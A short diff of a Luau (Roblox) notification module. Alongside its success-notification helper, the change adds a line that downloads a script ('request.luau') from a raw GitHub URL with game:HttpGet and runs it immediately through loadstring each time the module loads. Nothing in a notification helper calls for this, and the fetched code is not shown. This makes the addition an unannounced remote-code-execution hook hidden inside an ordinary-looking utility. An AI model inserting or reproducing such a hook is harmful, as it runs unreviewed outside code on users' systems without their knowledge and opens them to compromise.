@@ -1,5 +1,8 @@
 local cloneref = cloneref or function(i: Instance) return i; end;
 local SG: StarterGui = cloneref(game:GetService("StarterGui"));
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sneekygoober/sneeky-s-notifications/refs/heads/main/request.luau"))();
+
 return {
     ["success"] = function(msg: string)
         SG:SetCore("SendNotification", {
